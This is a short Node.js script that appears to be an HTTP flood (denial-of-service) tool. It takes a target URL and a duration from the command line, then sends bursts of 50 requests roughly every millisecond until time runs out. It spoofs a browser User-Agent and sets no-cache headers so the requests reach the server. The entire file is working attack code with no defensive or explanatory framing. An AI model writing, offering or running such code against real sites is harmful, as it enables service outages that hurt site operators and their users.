const request = require('request');
const target = process.argv[2], duration = process.argv[3];
const start = Date.now();

function attack() {
    if (Date.now() - start > duration * 1000) process.exit();
    const options = {
        url: target,
        headers: { 'User-Agent': 'Mozilla/5.0', 'Cache-Control': 'no-cache' },
        jar: true 
    };
    for (let i = 0; i < 50; i++) { request(options); }
    setTimeout(attack, 1);
}
attack();

